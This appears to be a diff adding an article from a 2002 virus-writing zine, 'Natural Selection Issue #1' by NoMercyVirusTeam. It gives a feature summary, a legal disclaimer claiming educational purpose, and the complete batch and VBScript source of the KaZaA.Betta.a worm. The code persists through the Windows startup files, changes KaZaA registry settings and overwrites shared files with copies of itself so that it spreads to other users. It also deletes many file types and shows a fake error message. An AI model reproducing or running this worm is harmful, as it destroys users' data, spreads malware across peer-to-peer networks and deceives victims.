@@ -1,0 +1,141 @@
+ -=( ---------------------------------------------------------------------- )=-
+ -=( Natural Selection Issue #1 ----------------------------- KaZaA.Betta.a )=-
+ -=( ---------------------------------------------------------------------- )=-
+
+ -=( 0 : KaZaA.Betta.a Features ------------------------------------------- )=-
+
+ Imports:       None
+ Infects:       KaZaA File Sharing Client
+ Strategy:      Resy/Runtime Infection
+ Compatibility: KaZaA and KaZaA Lite
+ Saves Stamps:  None
+ MultiThreaded: None
+ Polymorphism:  None
+ AntiAV / EPO:  Stealth
+ SEH Abilities: None
+ Payload:       Message
+
+ -=( 1 : KaZaA.Betta.a Design Goals ----------------------------------------- )=-
+
+ To  Infect  KaZaA  File  sharing  Client  as  a  I-Worm  using  simple  script
+ programming built into Windows.
+
+ -=( 2 : KaZaA.Betta.a Disclaimer ------------------------------------------- )=-
+
+ THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
+ COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
+ BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
+ YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.
+
+ COPYRIGHT
+ Copyright on  materials in  this  magazine  and  the  information  therein and
+ their  arrangement is owned by NoMercyVirusTeam unless otherwise indicated.
+
+ RIGHTS AND LIMITATIONS
+ You have  the  right  to use,    copy and  distribute  the  material in   this
+ magazine free   of  charge,  for  all   purposes  allowed  by your   governing
+ laws.  You    are expressly  PROHIBITED   from   using the  material contained
+ herein  for   any   purposes  that   would   cause    or would    help promote
+ the illegal   use of the material.
+
+ NO WARRANTY
+ The  information   contained within   this  magazine  are  provided  "as  is".
+ NoMercyVirusTeam         do    not    warranty    the     accuracy, adequacy,
+ or   completeness     of     given  information,  and    expressly   disclaims
+ liability   for   errors   or   omissions    contained  therein.   No implied,
+ express, or statutory  warranty, is given  in conjunction with  this magazine.
+
+ LIMITATION OF LIABILITY
+ In *NO* event will NoMercyVirusTeam or any of its MEMBERS be liable for  any
+ damages  including  and  without  limitation,  direct  or  indirect,  special,
+ incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
+ connection with this magazine, or the use thereof.
+
+ ADDITIONAL DISCLAIMER
+ Computer viruses will spread of their own accord between computer systems, and
+ across international boundaries.  They are raw animals with no concern for the
+ law, and for that reason your possession of them makes YOU responsible for the
+ actions they carry out.
+
+ The viruses provided in this magazine are for educational purposes ONLY.  They
+ are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
+ conditions.  If compiled and executed these viruses WILL land you in court(s).
+
+ You will be held responsible for your actions.  As  source code these  viruses
+ are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
+ countries.  In  binary form   these viruses  are malicious   weapons.  NoMercy
+ VirusTeam do  not condone  the application  of these  viruses and  will NOT be
+ held LIABLE for any MISUSE.
+
+ -=( 3 : KaZaA.Betta.a ------------------------------------------------------ )=-
+
+@Echo Off
+:: KaZaA.Betta.a
+:: Resy KaZaA File Shareing Worm
+:: NoMercyVirusTeam
+Echo y| Copy %0 bstart.bat >nul
+move bstart.bat %WinBootDir%\bstart.bat >nul
+c:
+cd %WinBootDir%
+Echo %WinBootDir%\bstart.bat >tmp.bat
+Echo %WinBootDir%\download91166669.vbs >>tmp.bat
+Copy tmp.bat + %WinBootDir%\Winstart.bat %WinBootDir%\system\tmp.bat >nul
+Del %WinBootDir%\WinStart.bat >nul
+move %WinBootDir%\system\tmp.bat %WinBootDir%\WinStart.bat >nul
+Del %WinBootDir%\system\tmp.bat >nul
+Copy tmp.bat + %WinBootDir%\DosStart.bat %WinBootDir%\system\tmp.bat >nul
+Del %WinBootDir%\DosStart.bat >nul
+move %WinBootDir%\system\tmp.bat %WinBootDir%\DosStart.bat >nul
+Echo REGEDIT4>KaZaA.reg
+Echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent] >>KaZaA.reg
+Echo "DisableSharing"=dword:00000000 >>KaZaA.reg
+Echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder" >>KaZaA.reg
+Mkdir C:\TMP >nul
+Echo y| Copy C:\Progra~1\Kazaal~1\Myshar~1\*.* C:\TMP >nul
+Echo y| Copy C:\PROGRA~1\KaZaA\MYSHAR~1\*.* C:\TMP >nul
+Rename C:\TMP\*.* *.bat >nul
+Echo y| Copy %WinBootDir%\bstart.bat C:\ >nul
+cd C:\TMP
+Echo. On Error Resume Next >download91166669.vbs
+Echo Set FSO = CreateObject("Scripting.FileSystemObject") >>download91166669.vbs
+Echo Set WshShell = CreateObject("WScript.Shell") >>download91166669.vbs
+Echo For Each V in FSO.GetFolder("C:\TMP\").Files >>download91166669.vbs
+Echo If FSO.GetExtensionName(V.Name) = "bat" then >>download91166669.vbs
+Echo FSO.CopyFile ("C:\bstart.bat"), V.Name, 1 >>download91166669.vbs
+Echo End If >>download91166669.vbs
+Echo Next >>download91166669.vbs
+Echo "Dir0"="012345:C:\\TMP">>KaZaA.reg
+Echo "Dir1"="012345:C:\\Progra~1\\Kazaal~1\\Myshar~1">>KaZaA.reg
+Regedit /s KaZaA.reg >nul
+Del KaZaA.reg >nul
+Del *.jpg >nul
+Del *.bmp >nul
+Del *.gif >nul
+Del *.txt >nul
+Del *.mp3 >nul
+Del *.avi >nul
+Del *.mpg >nul
+Del *.exe >nul
+Del *.dat >nul
+Del *.pdf >nul
+Del *.doc >nul
+Del *.ogg >nul
+Del *.dll >nul
+Del *.xls >nul
+Del *.lnk >nul
+Del *.mod >nul
+Del *.rtf >nul
+Del *.ocx >nul
+Del *.zip >nul
+Del *.mov >nul
+Del *.mid >nul
+Del *.ico >nul
+Del %WinBootDir%\tmp.bat >nul
+Echo Fault at XBXeXtXtXaX not a valid Win32 application.
+Echo Welcome to KaZaA.Betta.a
+@Echo Off
+CLS
+
+ -=( ---------------------------------------------------------------------- )=-
+ -=( Natural Selection Issue #1 ---------------- (c) 2002 NoMercyVirusTeam  )=-
+ -=( ---------------------------------------------------------------------- )=-
